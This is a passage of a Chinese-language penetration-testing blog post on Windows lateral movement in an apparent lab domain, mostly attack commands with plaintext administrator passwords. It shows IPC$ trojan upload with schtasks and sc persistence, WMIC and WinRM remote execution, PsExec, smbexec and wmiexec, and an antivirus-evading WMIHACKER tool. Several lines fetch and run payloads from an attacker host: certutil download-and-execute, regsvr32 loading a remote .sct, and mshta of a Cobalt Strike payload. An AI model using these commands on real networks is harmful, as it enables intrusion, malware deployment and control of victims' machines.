MINUTE、HOURLY、DAILY 或 WEEKLY 计划，这个参数有效，但也可选。默认值为 1。</span><br><span class="line">         /tr &lt;TaskRun&gt;       指定任务运行的程序或命令。如果忽略该路径，SchTasks.exe 将假定文件在Systemroot\System32 目录下。</span><br><span class="line">         /tn &lt;TaskName&gt;      指定任务的名称。</span><br></pre></td></tr></table></figure>

<h4 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h4><ul>
<li>建立IPC连接</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\10.10.10.201 /user:PC\administrator &quot;1qaz@WSX&quot;</span><br><span class="line">net use</span><br></pre></td></tr></table></figure>

<ul>
<li>上传木马</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir \\10.10.10.201\c$</span><br><span class="line">copy c:\windows\temp\59.exe \\10.10.10.201\c$</span><br></pre></td></tr></table></figure>

<ul>
<li>远程主机创建定时任务</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /create /s 10.10.10.30 /u PC\administrator /p &quot;1qaz@WSX3&quot; /sc MINUTE /mo 1 /tn test2 /tr &quot;c:\59.exe&quot;</span><br><span class="line"></span><br><span class="line">/sc minute 	间隔类型：分钟，minute、month、day、hours</span><br><span class="line">/mo 1		间隔时常：每1，配合/sc，表示每1分钟</span><br></pre></td></tr></table></figure>

<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081304694.png" alt="image-20220808130447566" style="zoom:50%;" />

<ul>
<li>查看远程主机创建的定时任务</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chcp 65001</span><br><span class="line">schtasks /query /s 10.10.10.201 /tn test2</span><br></pre></td></tr></table></figure>

<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081305648.png" alt="image-20220808130550497" style="zoom:50%;" />

<p>不更改代码页编码，直接查看可能会显示如下错误：</p>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081306574.png" alt="image-20220808130607471" style="zoom:50%;" />

<ul>
<li>立即执行Schtasks运行远程主机上的计划任务</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /run /s 10.10.10.201 /u de1ay\administrator /p &quot;1qaz@WSX3&quot; /tn test2</span><br></pre></td></tr></table></figure>

<ul>
<li>Schtasks删除远程主机上的计划任务</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /delete /tn At1 /s 10.10.10.201 /u administrator /p 1qaz@WSX3e</span><br></pre></td></tr></table></figure>

<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081306353.png" alt="image-20220808130645254" style="zoom:50%;" />

<h2 id="IPC-SC"><a href="#IPC-SC" class="headerlink" title="IPC+SC"></a>IPC+SC</h2><h3 id="SC简介"><a href="#SC简介" class="headerlink" title="SC简介"></a>SC简介</h3><p>sc 命令是Windows系统下通过<strong>注册、删除和查询系统服务</strong>的一个东西。</p>
<p>注意：</p>
<ul>
<li>关于Windows服务，其均是以system权限启动，所以我们如果通过注册建立了一个服务，通过服务开启的终端将也会具备system的权限！！另外需要管理员权限才能创建服务。也就是从管理员到系统权限的一个过程</li>
</ul>
<blockquote>
<p>sc命令详解：<a target="_blank" rel="noopener" href="http://www.cnsendblog.com/?p=644">http://www.cnsendblog.com/?p=644</a></p>
<p>视频粗略讲解：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1t54y1e7Qj?spm_id_from=333.337.search-card.all.click&amp;vd_source=e73a152dada4626bad49c30d848902f7">https://www.bilibili.com/video/BV1t54y1e7Qj?spm_id_from=333.337.search-card.all.click&amp;vd_source=e73a152dada4626bad49c30d848902f7</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法格式：</span><br><span class="line">SC [Servername] command Servicename [Optionname= Optionvalues]</span><br><span class="line"></span><br><span class="line">常见：</span><br><span class="line">sc \query 			查看系统所有服务信息 ，询问一个服务的状态，也可以列举服务的状态类型。 有很多 一般会超出缓冲区限制，可以先复制到剪切板</span><br><span class="line">sc \query | clip	查看全部内容</span><br><span class="line">sc \query +服务名 	  查看指定名称的信息</span><br><span class="line">sc 					可以通过config设置服务的状态</span><br><span class="line">sc stop +服务名  	  停止服务</span><br><span class="line">sc config +服务名 start= 类型	设置服务的启动类型（注意类型前有空格）</span><br><span class="line">sc qc --------------查询服务的配置信息</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ul>
<li>很多的命令需要管理员权限，所以我想说，在你操作这些东西的时候最好是管理员。</li>
<li>当你键入SC而不带任何参数时，SC.exe会显示帮助信息和可用的命令。当你键入SC紧跟着命令名称时，你可以得 到一个有关这个命令的详细列表。比如，键入sc create可以得到和create有关的列表。 但是除了一个命令，sc query，这会导出该系统中当前正在运行的所有服务和驱动程序的状态。 </li>
<li>当你使用start命令时，你可以传递一些参数（arguments）给服务的主函数，但是不是给服务进程的主函数。</li>
</ul>
<h3 id="SC远程注册服务"><a href="#SC远程注册服务" class="headerlink" title="SC远程注册服务"></a>SC远程注册服务</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#sc远程创建服务</span><br><span class="line">sc \\10.10.10.201 create test binpath= &quot;c:\59.exe&quot; obj= &quot;de1ay\administrator&quot; password= 1qaz@WSX3e</span><br><span class="line">#sc启动指定服务</span><br><span class="line">sc \\10.10.10.201 start test</span><br><span class="line">#sc停止指定服务</span><br><span class="line">sc \\10.10.10.201 stop test</span><br><span class="line">sc \\10.10.10.201 delete test</span><br></pre></td></tr></table></figure>

<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081307487.png" alt="image-20220808130724362" style="zoom:50%;" />

<p><strong>注意几点：</strong></p>
<ul>
<li><p>binpath设置选项’&#x3D;’后面有一个空格,这种选项等会后面都要接一个等号再接选项值</p>
</li>
<li><p>Windows上注册一个服务的话，必须要是服务类型，也就是创建时候binpath的文件要是服务，而不是进程。因为如果不是一个服务的话，就会导致生成的服务和服务控制器之间无法通信，服务控制器会判定这个服务不是一个系统的服务。因此就会产生隔一段时间就会断掉的现象。那么如何解决此类问题呢？</p>
<p>方法一：进程迁移，在连接终端期间执行其他命令。将我们的连接稳固到其他进程中</p>
<p>方法二：通过sc注册服务，生成的木马要是服务类型。可以在cs中生成。</p>
</li>
</ul>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208131628485.png" alt="image-20220813162825167" style="zoom:50%;" />

<ul>
<li>另外在启动服务类型中分为本地系统启动和远程网络启动。注意最后一项</li>
</ul>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208131630098.png" alt="image-20220813163020930" style="zoom:50%;" />

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc \\10.10.10.201 qc test</span><br><span class="line"></span><br><span class="line">qc--------------查询服务的配置信息。</span><br></pre></td></tr></table></figure>

<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081307785.png" alt="image-20220808130752669" style="zoom:50%;" />

<h2 id="WMIC"><a href="#WMIC" class="headerlink" title="WMIC"></a>WMIC</h2><h3 id="WMIC简介"><a href="#WMIC简介" class="headerlink" title="WMIC简介"></a>WMIC简介</h3><p>WMI:(Windows Management Instrumentation Windows 管理规范)，是用户管理本地和远程计算机的一种模型。通过它<strong>可以访问、配置、管理和监视几乎所有的Windows资源</strong>。WMI的语法十分简单，基本上常见的命名空间、对象等用几乎一模一样。它对应的是Windows里的WMI服务（winmgmt）。</p>
<p>在 windows 2000之后的操作系统中内置了该服务。WMI使用公共信息模型（CIM）表示托管组件，其中包括系统、应用程序、网络等等。CIM中使用类表示管理对象，命名空间是一个类的集合。</p>
<p><strong>通过使用135端口上的远程过程调用(RPC)进行通信以进行远程访问,它允许系统管理员远程执行自动化管理任务，例如远程启动服务或执行命令。</strong> </p>
<p>而WMIC是为WMI提供的命令行界面。</p>
<blockquote>
<p>详细参考：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/win32/wmisdk/wmic">https://docs.microsoft.com/zh-cn/windows/win32/wmisdk/wmic</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/discover2210212455/article/details/82711930">https://blog.csdn.net/discover2210212455/article/details/82711930</a></p>
</blockquote>
<h4 id="命令使用条件"><a href="#命令使用条件" class="headerlink" title="命令使用条件"></a>命令使用条件</h4><ol>
<li>Windows Management Instrumentation 服务开启，端口TCP 135，默认开启</li>
<li>防火墙允许135、445等端口通信</li>
</ol>
<h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p>实际上wmic能对本地主机做什么操作 就能对远程主机做什么操作</p>
<ul>
<li>查询进程信息</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic /node:10.10.10.30 /user:pc\administrator /password:1qaz@WSX process list brief</span><br></pre></td></tr></table></figure>

<p><strong>WMI不支持执行命令，而是支持执行文件</strong>，可以通过加相应的参数执行命令，比如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic /node:10.10.10.201 /user:administrator /password:1qaz@WSX3e process call create &quot;cmd.exe /c ipconfig&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>利用create创建进程</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic process call create /?</span><br><span class="line">调用                    [ 内/外 ]参数类型(&amp;T)							状态        </span><br><span class="line">====                    =====================						======        </span><br><span class="line">Create                  [IN ]CommandLine(STRING)                    (null)</span><br><span class="line">                        [IN ]CurrentDirectory(STRING)</span><br><span class="line">                        [IN ]ProcessStartupInformation(OBJECT)</span><br><span class="line">                        [OUT]ProcessId(UINT32)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic /node:10.10.10.201 /user:administrator /password:1qaz@WSX3e process call create &quot;cmd /c calc.exe&quot;</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ul>
<li><blockquote>
<p>如果出现User credentials cannot be used for local connections,应该是调用calc.exe程序权限不够的问题</p>
</blockquote>
</li>
<li><blockquote>
<p>如果出现Description &#x3D; 无法启动服务，原因可能是已被禁用或与其相关联的设备没有启动，判断WMI服务被禁用</p>
</blockquote>
</li>
</ul>
<p><strong>wmic命令缺点是没有回显，可以使用wmiexec.vbs脚本实现回显。</strong></p>
<ul>
<li>下载远程文件并执行上线</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic /node:10.10.10.201 /user:administrator /password:1qaz@WSX3e process call create &quot;cmd /c  certutil.exe -urlcache -split -f http://10.10.10.80/test.exe c:/windows/temp/test.exe &amp; c:/windows/temp/test.exe&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">certutil.exe -urlcache -split -f http://10.10.10.80/test.exe c:/windows/temp/test.exe &amp; c:/windows/temp/test.exe</span><br><span class="line">是录播中的知识 文件下载</span><br><span class="line">我们可以用Windows下管理证书的certutil.exe程序下载远程主机的恶意文件，保存在c:/windows/temp/test.exe目录，再&amp;之后执行程序上线</span><br><span class="line">注意这个地方的远程主机（指的是我们已经拿下的web机器，因为内网pc机器不出网，所以只好放在这台机器上的web服务，给内网目标主机下载）</span><br><span class="line"></span><br><span class="line">实际上，当我们内网主机不能出网的时候，我们就可以通过在拿下的机器上做文章，放文件 </span><br></pre></td></tr></table></figure>

<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081313574.png" alt="image-20220808131343441"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic /node:10.10.10.201 /user:administrator /password:1qaz@WSX3e process call create &quot;regsvr32 /s /n /u /i:http://192.168.78.117:8080/feY7nzY.sct scrobj.dll&quot;</span><br><span class="line"></span><br><span class="line">regsvr32 是com组件注册的一个命令。</span><br><span class="line">msf可以生成sct的文件，再通过远程加载sct，即可上线</span><br></pre></td></tr></table></figure>

<h3 id="msf利用wmic"><a href="#msf利用wmic" class="headerlink" title="msf利用wmic"></a>msf利用wmic</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/local/wmi) &gt; options</span><br><span class="line">使用该模块，提供账户密码，就可以通过wmic执行命令~~~</span><br><span class="line">需要注意防火墙</span><br></pre></td></tr></table></figure>

<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208220052488.png" alt="image-20220822005215206"></p>
<h2 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h2><h3 id="WinRM简介"><a href="#WinRM简介" class="headerlink" title="WinRM简介"></a>WinRM简介</h3><p>WinRM 指的是Windows远程管理服务，通过<strong>远程连接winRM模块可以操作windows命令行</strong>，默认监听端口5985（HTTP）和5986 (HTTPS)，在2012及以后默认开启。低于此版本要手动开启（靶场的PC机器和web机器都没有开启，需要手动开启）</p>
<h3 id="开启WinRM"><a href="#开启WinRM" class="headerlink" title="开启WinRM"></a>开启WinRM</h3><ul>
<li>判断本机是否开启WinRM服务</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm enumerate winrm/config/listener</span><br><span class="line">下图表示没有开启</span><br></pre></td></tr></table></figure>

<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208131908850.png" alt="image-20220813190855609" style="zoom:50%;" />

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano | findstr 5985</span><br><span class="line">wmic service list brief | findstr WinRM</span><br></pre></td></tr></table></figure>

<ul>
<li>判断目标主机是否开启WinRM服务</li>
</ul>
<p>查看远程主机是否开启WinRM服务：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ServerScan.exe -h 10.10.10.30 -p 5985,5986</span><br></pre></td></tr></table></figure>

<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081315752.png" alt="image-20220808131520618"></p>
<ul>
<li>查看远程WinRM服务是否正常：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test-wsman 10.10.10.30</span><br></pre></td></tr></table></figure>

<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081315465.png" alt="image-20220808131537317"></p>
<ul>
<li>命令开启WinRM服务</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm quickconfig</span><br></pre></td></tr></table></figure>

<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081316922.png" alt="image-20220808131617740" style="zoom: 50%;" />

<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081316137.png" alt="image-20220808131639012"></p>
<ul>
<li>允许远程主机访问及访问远程主机（即开启允许外连）</li>
</ul>
<p>WinRM只允许当前域用户或者处于本机TrustedHosts列表中的远程主机进行访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm set winrm/config/client @&#123;TrustedHosts=&quot;*&quot;&#125;</span><br></pre></td></tr></table></figure>

<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081317247.png" alt="image-20220808131705064" style="zoom:50%;" />

<h3 id="Winrs执行命令"><a href="#Winrs执行命令" class="headerlink" title="Winrs执行命令"></a>Winrs执行命令</h3><p>winrs内置命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrs -r:http://10.10.10.201:5985 -u:administrator -p:1qaz@WSX3e ipconfig</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrs -r:http://10.10.10.201:5985 -u:administrator -p:1qaz@WSX3e &quot;cmd.exe&quot;</span><br></pre></td></tr></table></figure>

<h3 id="WinRM横向移动"><a href="#WinRM横向移动" class="headerlink" title="WinRM横向移动"></a>WinRM横向移动</h3><ul>
<li>利用winrm参数选项中的invoke参数，来对目标对象执行特定的方法。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm invoke create wmicimv2/win32_process @&#123;Commandline=&quot;calc.exe&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>命令调用了Windows WMI中Win32_process类的Create方法，生成了一个calc.exe的新进程</p>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081318509.png" alt="image-20220808131818326" style="zoom:50%;" />

<ul>
<li>在远程机器上打开进程</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm invoke create wmicimv2/win32_process @&#123;Commandline=&quot;calc.exe&quot;&#125; -r:http://10.10.10.201:5985 -u:administrator -p:1qaz@WSX3e</span><br></pre></td></tr></table></figure>

<ul>
<li>在远程机器上创建服务</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm invoke Create wmicimv2/Win32_Service @&#123;Name=&quot;test&quot;;DisplayName=&quot;test&quot;;PathName=&quot;cmd.exe /k c:\59.exe&quot;&#125; -r:http://10.10.10.201:5985 -u:administrator -p:1qaz@WSX3e</span><br><span class="line"></span><br><span class="line">调用Win32_Service类</span><br></pre></td></tr></table></figure>

<ul>
<li>在远程机器上启动服务</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm invoke StartService wmicimv2/Win32_Service?Name=test -r:http://10.10.10.201:5985 -u:administrator -p:1qaz@WSX3e</span><br></pre></td></tr></table></figure>

<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081319710.png" alt="image-20220808131946534" style="zoom:50%;" />

<h1 id="横向移动-外部工具篇"><a href="#横向移动-外部工具篇" class="headerlink" title="横向移动-外部工具篇"></a>横向移动-外部工具篇</h1><h2 id="Smbexec、Psexec"><a href="#Smbexec、Psexec" class="headerlink" title="Smbexec、Psexec"></a>Smbexec、Psexec</h2><h3 id="Psexec简介"><a href="#Psexec简介" class="headerlink" title="Psexec简介"></a>Psexec简介</h3><p>PsExec是一种轻巧的telnet替代品，可让您在其他系统上<strong>执行进程，并为控制台应用程序提供完整的交互性，而无需手动安装客户端软件</strong>。</p>
<blockquote>
<p>在”H:\ATTACK\权限提升\SysinternalsSuite\PsExec.exe”目录中有</p>
<p>psexec下载地址：<br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</a><br>impacket下载地址：<br>py：<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a><br>exe：<a target="_blank" rel="noopener" href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></p>
<p>impacket相较于微软官方的sysinternalsuits更好用</p>
</blockquote>
<h3 id="Psexec原理"><a href="#Psexec原理" class="headerlink" title="Psexec原理"></a>Psexec原理</h3><ol>
<li>ipc$ 连接,释放 Psexesvc.exe（即将服务程序复制到目标主机上）</li>
<li>通过服务管理 OpenSCManager 打开受害者机器上服务控制管理器的句柄（也就是打开服务控制管理器）</li>
<li>通过 CreateService 创建服务</li>
<li>获取服务句柄 OpenService 使用 StartService 启动服务</li>
</ol>
<h3 id="Psexec使用前提"><a href="#Psexec使用前提" class="headerlink" title="Psexec使用前提"></a>Psexec使用前提</h3><ol>
<li>对方主机开启了 admin$  共享，如果关闭了 admin$ 共享，会提示：找不到网络名</li>
<li>对方未开启防火墙</li>
<li>如果是工作组环境，则必须使用 administrator 用户连接（因为要在目标主机上面创建并启动服务），使用其他账号(包括管理员组中的非administrator用户)登录都会提示访问拒绝访问。</li>
<li>如果是域环境，即可用普通域用户连接也可以用域管理员用户连接。连接普通域主机可以用普通域用户，连接域控只能用域管理员账户。</li>
</ol>
<h3 id="PsExec-exe使用"><a href="#PsExec-exe使用" class="headerlink" title="PsExec.exe使用"></a>PsExec.exe使用</h3><p>微软官方工具包</p>
<ul>
<li>直接使用</li>
</ul>
<blockquote>
<ul>
<li><p>第一次运行会弹框,输入 –accepteula 这个参数就可以绕过</p>
</li>
<li><p>如果出现找不到网络名，判断目标主机已禁用ADMIN$共享</p>
</li>
</ul>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\PsExec.exe \\192.168.10.201 -u de1ay\Administrator -p 1qaz@WSX3e -s cmd.exe -accepteula</span><br></pre></td></tr></table></figure>

<ul>
<li>建立IPC连接，无需输入密码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\IP /u:域名称\域账号 密码</span><br><span class="line">反弹cmd：</span><br><span class="line">psexec.exe \\10.10.10.201 -s cmd.exe -accepteula</span><br><span class="line">执行命令：</span><br><span class="line">psexec.exe \\10.10.10.201 whoami -accepteula</span><br></pre></td></tr></table></figure>

<ul>
<li>重要参数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-c &lt;[路径]文件名&gt;:拷贝文件到远程机器并运行（注意：运行结束后文件会自动删除）</span><br><span class="line">-d 不等待程序执行完就返回</span><br><span class="line">比如想上传一个本地的getpass到你远程连接的服务器上去运行（很方便）:</span><br><span class="line">Psexec.exe \\ip -u user -p pass -c c:\getpass.exe –d</span><br></pre></td></tr></table></figure>

<ul>
<li>Cobaltstrike</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell psexec.exe \\10.10.10.201 -u de1ay\Administrator -p 1qaz@WSX3e whoami</span><br><span class="line">beacon&gt; shell psexec.exe \\10.10.10.201 -u de1ay\Administrator -p 1qaz@WSX3e mshta http://192.168.78.117:8088/download/file.ext</span><br></pre></td></tr></table></figure>

<p>psexec 传递命令时不要添加双引号否则会爆 “系统找不到指定的文件” 的错误。</p>
<h3 id="Psexec-py"><a href="#Psexec-py" class="headerlink" title="Psexec.py"></a>Psexec.py</h3><p>impacket套件中的Psexec与官方psexec.exe相比会自动删除服务，增加隐蔽性</p>
<ul>
<li>交互式命令行</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt;psexec.py de1ay/administrator:1qaz@WSX3e@10.10.10.201</span><br><span class="line"></span><br><span class="line">Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies</span><br><span class="line">[*] Requesting shares on 10.10.10.201.....	请求文件共享</span><br><span class="line">[*] Found writable share ADMIN$			找到一个可写的文件共享</span><br><span class="line">[*] Uploading file DabwFVJj.exe		</span><br><span class="line">[*] Opening SVCManager on 10.10.10.201.....</span><br><span class="line">[*] Creating service KNri on 10.10.10.201.....</span><br><span class="line">[*] Starting service KNri.....</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;exit			退出会会自动清理文件</span><br><span class="line">[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0</span><br><span class="line">[*] Opening SVCManager on 10.10.10.201.....</span><br><span class="line">[*] Stoping service KNri.....</span><br><span class="line">[*] Removing service KNri.....</span><br><span class="line">[*] Removing file DabwFVJj.exe.....</span><br></pre></td></tr></table></figure>

<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081329748.png" alt="image-20220808132958587" style="zoom:33%;" />

<ul>
<li>直接执行命令</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt;psexec.exe de1ay/administrator:1qaz@WSX3e@10.10.10.201 whoami</span><br><span class="line">Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies</span><br><span class="line">[*] Requesting shares on 10.10.10.201.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file SLZVAxLl.exe</span><br><span class="line">[*] Opening SVCManager on 10.10.10.201.....</span><br><span class="line">[*] Creating service slqx on 10.10.10.201.....</span><br><span class="line">[*] Starting service slqx.....</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">nt authority\system</span><br><span class="line">[*] Process whoami finished with ErrorCode: 0, ReturnCode: 0</span><br><span class="line">[*] Opening SVCManager on 10.10.10.201.....</span><br><span class="line">[*] Stoping service slqx.....</span><br><span class="line">[*] Removing service slqx.....</span><br><span class="line">[*] Removing file SLZVAxLl.exe.....</span><br></pre></td></tr></table></figure>

<ul>
<li>Cobaltstrike</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell c:\psexec.exe administrator:1qaz@WSX@10.10.10.201 whoami</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell c:\psexec.exe administrator:1qaz@WSX@10.10.10.201 mshta http://192.168.78.104:80/download/file.ext</span><br></pre></td></tr></table></figure>

<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081331667.png" alt="image-20220808133147513" style="zoom:50%;" />

<h3 id="Smbexec-py"><a href="#Smbexec-py" class="headerlink" title="Smbexec.py"></a>Smbexec.py</h3><p>impacket套件中smbexec是一款基于psexec的域渗透测试工具，并配套samba工具。<br>445端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt;smbexec.py de1ay/administrator:1qaz@WSX3e@10.10.10.201</span><br><span class="line">Impacket v0.9.17 - Copyright 2019 SecureAuth Corporation</span><br><span class="line">[!] Launching semi-interactive shell - Careful what you execute</span><br></pre></td></tr></table></figure>

<h2 id="Wmiexec"><a href="#Wmiexec" class="headerlink" title="Wmiexec"></a>Wmiexec</h2><h3 id="Wmiexec-vbs"><a href="#Wmiexec-vbs" class="headerlink" title="Wmiexec.vbs"></a>Wmiexec.vbs</h3><p>基本原理：当用户输入命令时，WMI创建进程执行该命令，然后把结果输出到文件，这个文件位于之前创建的共享文件夹。最后，通过FSO组件访问远程共享文件夹（需要用到445端口）中的结果文件，将结果输出。当结果读取完成时，调用WMI执行命令删除结果文件。最后当WMIEXEC退出时，删除文件共享。</p>
<ol>
<li>单命令执行</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cscript.exe wmiexec.vbs /cmd ip username password &quot;command&quot;</span><br></pre></td></tr></table></figure>

<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081342452.png" alt="image-20220808134239306" style="zoom:50%;" />

<ol start="2">
<li>半交互模式</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell cscript.exe //nologo c:\wmiexec.vbs /shell ip username password</span><br></pre></td></tr></table></figure>

<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081343522.png" alt="image-20220808134319303" style="zoom:50%;" />

<ol start="3">
<li>注意</li>
</ol>
<p>wmi只是创建进程,没办法去判断一个进程是否执行完成(比如ping),这样就导致wmi.dll删除不成,下一次又是被占用,这时候修改一下vbs里面的名字就好：Const FileName &#x3D; “wmi1.dll”,也可以加入-persist参数(后台运行)</p>
<p>非域用户登陆到win08和2012中,只有administrator可以登陆成功,其他管理员账号会出现 WMIEXEC ERROR: Access is denied</p>
<h3 id="WMI-HACKER"><a href="#WMI-HACKER" class="headerlink" title="WMI-HACKER"></a>WMI-HACKER</h3><p>介绍：免杀横向渗透远程命令执行，常见的WMIEXEC、PSEXEC执行命令是创建服务或调用Win32_Process.create执行命令，这些方式都已经被杀软100%拦截，通过改造出WMIHACKER免杀横向移动测试工具。此工具通过135端口进行命令执行，读取执行结果以及进行文件传输时无需445端口，通过把执行结果写入注册表中，然后进行读取。</p>
<p>主要功能：1、命令执行；2、文件上传；3、文件下载<br>使用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cscript //nologo WMIHACKER_0.6.vbs</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有命令回显执行方式</span><br><span class="line">&gt; cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator &quot;Password!&quot; &quot;systeminfo&quot; 1</span><br><span class="line">无命令回显</span><br><span class="line">&gt; cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator &quot;Password!&quot; &quot;systeminfo &gt; c:\1.txt&quot; 0</span><br><span class="line">模拟shell模式</span><br><span class="line">&gt; cscript WMIHACKER_0.6.vbs /shell 172.16.94.187 administrator &quot;Password!&quot;</span><br><span class="line">文件上传-复制本机calc.exe到远程主机c:\calc.exe</span><br><span class="line">&gt; cscript wmihacker_0.4.vbe /upload 172.16.94.187 administrator &quot;Password!&quot; &quot;c:\windows\system32\calc.exe&quot; &quot;c:\calc&quot;</span><br><span class="line">文件下载-下载远程主机calc.exe到本地c:\calc.exe</span><br><span class="line">&gt; cscript wmihacker_0.4.vbe /download 172.16.94.187 administrator &quot;Password!&quot; &quot;c:\calc&quot; &quot;c:\windows\system32\calc.exe&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>360-Linton-Lab&#x2F;WMIHACKER(连接 上GitHub上康康)</p>
</blockquote>
<h3 id="wmicmd-exe"><a href="#wmicmd-exe" class="headerlink" title="wmicmd.exe"></a>wmicmd.exe</h3><p>wmicmd命令回显（工作组）</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/nccgroup/WMIcmd">https://github.com/nccgroup/WMIcmd</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WMIcmd.exe -h 10.10.10.201 -u administrator -p 1qaz@WSX -d . -c &quot;ipconfig&quot;</span><br></pre></td></tr></table></figure>

